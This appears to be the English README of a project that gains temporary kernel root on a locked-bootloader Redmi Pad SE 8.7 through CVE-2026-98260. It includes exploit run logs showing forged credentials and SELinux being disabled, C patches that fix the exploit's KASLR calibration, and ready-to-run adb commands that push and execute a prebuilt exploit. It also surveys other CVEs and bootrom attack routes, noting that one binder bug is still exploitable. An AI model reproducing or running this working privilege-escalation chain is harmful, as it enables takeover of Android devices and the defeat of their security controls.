# Redmi Pad SE 8.7 — Unlocked-Bootloader-Free ROOT Research Log

[**中文**](README.md) · **English**

> Achieved **full kernel-level ROOT** (`uid=0` + `u:r:ksu:s0` + full capabilities + KernelSU)
> via `CVE-2026-98260` while the **bootloader stayed locked**, with **zero partition writes**
> and **no bricking**.

[![Device](https://img.shields.io/badge/device-Redmi%20Pad%20SE%208.7%20(flare)-orange)]()
[![Android](https://img.shields.io/badge/Android-16%20%2F%20HyperOS%203.0.303-green)]()
[![Kernel](https://img.shields.io/badge/kernel-6.6.118--android15--8-blue)]()
[![CVE](https://img.shields.io/badge/CVE--2026--98260-red)]()
[![Bootloader](https://img.shields.io/badge/bootloader-LOCKED-critical)]()

---

## 1. Final result

```console
$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0

$ adb shell su -c 'grep Cap /proc/self/status'
CapInh: 0000000000000000
CapPrm: 000001ffffffffff       ← full capability set
CapEff: 000001ffffffffff
CapBnd: 000001ffffffffff

$ adb shell su -c 'ls /data/adb'
ksu
ksud

$ adb shell su -c 'cat /proc/self/attr/current; getenforce'
u:r:ksu:s0
Enforcing

$ adb shell grep kernelsu /proc/modules
kernelsu 180224 4 - Live 0x0000000000000000 (O)
```

**Nature: temporary root.** Everything modified lives in kernel memory, so it is lost on
reboot and can be re-obtained by re-running one command.
**The bootloader stays locked (`verifiedbootstate=green`) and nothing was ever flashed.**

---

## 2. Target device

| Item | Value |
|---|---|
| Model | Redmi Pad SE 8.7 |
| Codename | `flare` |
| Part number | `24075RP89G` |
| SoC | MediaTek **MT8786V/N** |
| ROM | HyperOS `OS3.0.303.0.WHXMIXM` |
| Android | 16 (`BP2A.250605.031.A3`) |
| Kernel | `6.6.118-android15-8-gc4127a25dcf3-ab15863337-4k` |
| Security patch | 2026-09-01 |
| Bootloader | **locked** / `verifiedbootstate=green` |
| Starting privilege | adb shell = `uid=2000`, no root |
| SELinux | Enforcing |

---

## 3. The core breakthrough: a KASLR-alignment assumption

This is the most valuable part of the project. **If you read only one section, read this one.**

### 3.1 Symptom

An exploit built from the public Shark source (fork v2.3.2) always stops here:

```
[calib] timers=0
[base] made=512 timers=0 pages=15 best=0 count=0
[-] base calibration failed
```

Yet **the upstream released binary (v2.5.1) works on the very same machine**, reporting `timers=512`.

**Source and binary disagree** — upstream changed the code without pushing it back to source.

### 3.2 Root cause

`scan_timer_allocs()` / `scan_task_allocs()` read `call_site` from the trace and then
**compare its low 21 bits against the low 21 bits of the link-time address**:

```c
if ((site & 0x1fffffULL) != TIMER_SITE_LOW21)
    continue;
```

**The problem: the low 21 bits shift along with the `mod 2MiB` component of the KASLR slide.**

Measured on our device:

```python
slide               = 0x2b45280000
slide & 0x1fffff    = 0x80000          # <- not zero!
```

Therefore:

| Symbol | Link-time low-21 | **Runtime low-21** | Compared against | Result |
|---|---|---|---|---|
| `do_timer_create+0xa8` | `0x195d48` | **`0x15d48`** | `0x195d48` | never matches |
| `copy_process+0x140` | `0x0ab93c` | **`0x12b93c`** | `0x0ab93c` | never matches |

**Evidence chain** — reconstructed from a successful run's log:

```
[cred] site_low=0x164064                       # runtime low-21 of prepare_creds+0x24
link-time low-21 of prepare_creds+0x24 = 0xe4064
delta = 0x164064 - 0xe4064 = 0x80000           # exactly slide mod 2MiB
```

The cred path worked (`recs=1`) only because its filter constant was set to `0`
(i.e. the check was skipped). The task path filters hard, hence `task_recs=0` forever.

### 3.3 Why upstream worked

Because the original author baked in a hard precondition:

```c
g_slide = site0 - STATIC_TIMER_SITE;
printf("PROBE_SLIDE=%#llx aligned=%d\n", g_slide, (g_slide & 0x1fffff) == 0);
if (g_slide & 0x1fffff)
    return 1;              // bail out if the slide is not 2MiB aligned
```

**The machine he validated on had a 2MiB-aligned KASLR (`aligned=1`).
Ours is 512KB aligned (`aligned=0`).**

### 3.4 Fix: self-calibration

ARM64 KASLR alignment is always a multiple of `0x80000`, so `slide mod 2MiB` has
**exactly 4 candidates**: `0 / 0x80000 / 0x100000 / 0x180000`.

**Let the program try all four and keep whichever matches the most events:**

```c
static unsigned long long g_low_adj = 0ULL;   /* slide mod 2MiB */

/* every low-21 comparison gets the adjustment */
if ((site & 0x1fffffULL) != ((TIMER_SITE_LOW21 + g_low_adj) & 0x1fffffULL))
    continue;
```

```c
/* calibration sweeps the 4 candidates */
static const unsigned long long cands[4] = {0ULL, 0x80000ULL, 0x100000ULL, 0x180000ULL};
int best_ci = 0, c = 0;
for (int ci = 0; ci < 4; ci++) {
    int cc;
    g_low_adj = cands[ci];
    cc = scan_timer_allocs(raw, n, me, ptrs, 512, NULL);
    if (cc > c) { c = cc; best_ci = ci; }
}
g_low_adj = cands[best_ci];
c = scan_timer_allocs(raw, n, me, ptrs, 512, NULL);  /* recollect with the final value */
```

And relax the hard alignment check:

```c
/* was: if (g_slide & 0x1fffffULL) return 1; */
if ((g_slide & 0x1fffffULL) && (g_slide & 0x7ffffULL))
    return 1;
```

### 3.5 Immediate effect

```
PROBE_TIMER made=128 recs=128 site=0xffffffebc5415d48 low_adj=0x80000
PROBE_SLIDE=0x2b45280000 aligned=0
[calib] timers=512 low_adj=0x80000
[base] made=512 timers=512 pages=21 best=0xffffff7fc0000000 count=330
[cred] R=0xffffff80c117a180 site_low=0x164064 recs=1
       task=0xffffff807a40cb00 task_recs=1          # 0 -> 1
PROBE_OK
```

**The full patch is in [`artifacts/patch_shark_low21.py`](artifacts/patch_shark_low21.py).**

---

## 4. The successful chain

```console
$ adb shell "cd /data/local/tmp && \
    PYB110_KSUD=/data/local/tmp/ksud33 \
    PYB110_MANAGER_PKG=me.weishu.kernelsu \
    PYB110_KMI=android15-6.6 \
    ./shark66118 --auto"
```

```
[calib] timers=512 low_adj=0x80000
[base] best=0xffffff7fc0000000 count=202
[cred] R=0xffffff80f9faaef0 task=0xffffff... task_recs=1
[+] stage fake_cred  ... free_seen=1 burst hit=1 after 48ms    # forge a full-cap cred
[+] stage selinux    ... free_seen=1 burst hit=1 after 132ms   # SELinux -> Permissive
[ksu] panic_on_warn=0
[+] stage fake_uid   ... free_seen=1 burst hit=1 after 103ms   # resuid=0/0/0
[+] cred writes landed, waking child
[child] woke uid=0 euid=0
[+] child report stage=2 uid=0 euid=0 resuid=0/0/0
PLANT_CRED_OK child=19711
PARKED=1
LATE_LOAD_CMD='/data/local/tmp/ksud33' late-load --kmi android15-6.6 \
    --allow-shell --package-name me.weishu.kernelsu
LATE_LOAD_RC=0
LATE_LOAD_SHELL_RC=0
```

```console
$ adb shell grep kernelsu /proc/modules
kernelsu 180224 4 - Live 0x0000000000000000 (O)

$ adb shell su -c id
uid=0(root) gid=0(root) groups=0(root) context=u:r:ksu:s0
```

**Each of the three stages needs its own successful page reclaim (`burst hit=1`),
so the first run may fail — just run it again.**

**Full reproduction steps: [`docs/en/11-reproduce.md`](docs/en/11-reproduce.md).**

---

## 5. What did not work (avoid these)

We spent an enormous amount of time exhausting almost every other route.
**All of the following are dead ends. Do not repeat them.**

| Route | Why it fails | Evidence |
|---|---|---|
| **CVE-2026-43499** (GhostLock, 4 public repos) | Kernel already backported the fix | Disassembly of `remove_waiter` contains **no** `mrs sp_el0`; it uses `waiter->task` |
| **CVE-2026-46242** (Bad Epoll, 99%-reliable PoC) | Patched | `ep_remove` contains the `getxr/stlxr` pin, the `cbz` gate, and a trailing `fput` |
| **mqsas** (`miui.mqsas.IMQSNative` vendor-service root) | Triple-blocked | (1) method indices 16–30 do not exist (public exploit needs 21); (2) `runCommand` has a command allowlist; (3) the backing `mqsasd` daemon is not running at all |
| **Magica** (app zygote can setuid once permissive) | Needs a Permissive window plus a zygote restart we had no way to trigger | We can only write kernel memory, not `ro.boot.selinux` |
| **MTK BROM / mtkclient / penumbra** | Xiaomi enables **BROM SLA + DAA** | penumbra FAQ: *"not enough to cover all devices, especially Xiaomi … you'll need paid auth"* |
| **fenrir** (unverified bl2_ext → EL3) | Requires an **already unlocked** bootloader to flash | README: *"When the bootloader is **unlocked** (seccfg)…"*; repo archived |
| **lkpatcher** | Needs mtkclient to unlock seccfg first; patches are 32-bit Thumb, we are arm64 | README |
| **Kamakiri** | BROM patched on 2023+ silicon | `USB_Endpoint0_Idle` gained a `wIndex` bounds check |
| **Heapbait** | DA2 patched around 2024-11; our firmware is 2026-07 | penumbra docs |
| **Carbonara** | Requires a signed DA1 plus paid SLA | penumbra docs |
| **DirtyFrag / Dirty Pipe** | Patched | — |
| **userfaultfd family** | `/proc/sys/vm/unprivileged_userfaultfd = 0` | measured on device |
| **NFC CVEs** | No NFC hardware | no `/dev/nfc*` |
| **5 nginx CVEs** (123007/123633/123634/121810/113425) | Completely unrelated to Android | all are NGINX2Root server bugs |
| **Two binder UAFs** (fixed in 6.6.145) | Binary looks unpatched, but it is a race and the engineering cost is large | `binder_free_transaction` has no `put_task_struct` — **this one is still viable, we just did not continue** |

**Full analysis: [`docs/en/03-dead-ends.md`](docs/en/03-dead-ends.md).**

---

## 6. Repository layout

```
.
├── README.md                     Chinese README
├── README.en.md                  ← you are here
├── docs/                         Chinese documentation
│   └── (13 chapters)
├── docs/en/                      English documentation
│   ├── 01-device.md              Device baseline
│   ├── 02-methodology.md         Recon methodology (how to rule routes out systematically)
│   ├── 03-dead-ends.md           ★ Every dead end with evidence
│   ├── 04-vulnerability.md       CVE-2026-98260 internals
│   ├── 05-kaslr.md               KASLR leak (tracefs raw records)
│   ├── 06-slab-layout.md         Slab geometry measurement
│   ├── 07-carriers.md            pipe vs AIO vs VMA
│   ├── 08-exact-hit.md           Confirm the hit before acting
│   ├── 09-root-cause.md          ★★ The 2MiB alignment assumption
│   ├── 10-breakthrough.md        Line-by-line breakdown of the winning log
│   ├── 11-reproduce.md           ★ From-scratch reproduction guide
│   ├── 12-pitfalls.md            ★ All bugs and incidents we hit
│   └── 13-timeline.md            Research timeline
├── artifacts/
│   ├── shark-k66118-fixed        Working aarch64 exploit
│   ├── plant_core.patched.inc    Patched source
│   ├── patch_shark_low21.py      Replayable patch script
│   ├── ksud-3.3.1                Matching ksud
│   └── SHA256SUMS
├── tools/                        Independent diagnostic programs
│   ├── pwn_min.c                 Minimal Stage A implementation
│   ├── cred_finder.c             perf-based cred discovery
│   ├── trace_probe.c             kprobe / free_slab / folio validation
│   ├── task_finder.c             task_struct allocation call_site probe
│   ├── surf_probe.c              Attack-surface reachability probe
│   ├── surf_probe2.c             Socket reachability probe
│   ├── kaslr_leak.c              Standalone KASLR leak
│   ├── kmem_perf.c               perf kmem tracepoint reader reference
│   ├── aio_probe.c               AIO carrier capacity check
│   └── trace_raw_leak.c          Real pointers from raw records
└── scripts/
    ├── build.sh                  Build all tools
    └── check-device.sh           Device compatibility check
```

---

## 7. Quick start

```bash
# 0. Check whether your device matches
./scripts/check-device.sh

# 1. Push the exploit and ksud
adb push artifacts/shark-k66118-fixed /data/local/tmp/shark66118
adb push artifacts/ksud-3.3.1        /data/local/tmp/ksud33
adb shell 'chmod 755 /data/local/tmp/shark66118 /data/local/tmp/ksud33'

# 2. Install the KernelSU manager (must be v3.3.1 / build 32680)
adb install -r -g KernelSU_v3.3.1_32680-release.apk

# 3. Fire (may fail on the first run; just retry)
adb shell "cd /data/local/tmp && \
  PYB110_KSUD=/data/local/tmp/ksud33 \
  PYB110_MANAGER_PKG=me.weishu.kernelsu \
  PYB110_KMI=android15-6.6 \
  ./shark66118 --auto"

# 4. Verify
adb shell su -c id
```

---

## 8. Success rate and risk

| Item | Observation |
|---|---|
| Single-run full success | roughly **2/3** (2 of 3 measured runs) |
| Behaviour on failure | prints `PARKED`, **keeps the zombie instead of blindly reaping, does not crash** |
| Kernel panic | about 6 runs after the fix, **0 panics** |
| Brick risk | **zero** — not a single partition write |
| Data risk | low (a panic while a file is being written could corrupt that file) |
| After reboot | root is gone, re-run needed; device is perfectly normal |

**Why it cannot brick**: searching the exploit source for `/dev/block`, `by-name`,
`mmcblk`, `dd if=`, `flash`, `reboot`, `insmod` yields **not one hit**. It only touches
kernel memory.

---

## 9. Credits

| Project | Role |
|---|---|
| [kpgc10kai/Shark](https://github.com/kpgc10kai/Shark) | Source base (fork of upstream v2.3.2) |
| [Yunnijian/Shark-Releases](https://github.com/Yunnijian/Shark-Releases) | Upstream binaries (v2.5.1), behaviour reference |
| [fynks/awesome-temporary-root](https://github.com/fynks/awesome-temporary-root) | The index that led us to Shark (documents a success on an identical kernel) |
| [quyicheng03-boop/CVE-2026-98260-popsicle-android](https://github.com/quyicheng03-boop/CVE-2026-98260-popsicle-android) | The EXACT HIT methodology |
| [WantenMN/cve-2026-98260-adb](https://github.com/WantenMN/cve-2026-98260-adb) | "Compute the exact node offset" idea |
| [vvb2060/Magica](https://github.com/vvb2060/Magica) | AOSP mechanism explanation for permissive → setuid |
| [R0rt1z2/penumbra](https://github.com/R0rt1z2/penumbra) | Authoritative MTK BROM/DA documentation (used to rule routes out) |

---

## 10. Disclaimer

**This project is for authorized security research on devices you own.**

- Use it only on hardware you own
- Kernel exploits can trigger a panic. Although this project never writes a partition and
  cannot brick the device, proceed at your own risk
- Do not use it on any device you are not authorised to test

**License: MIT**
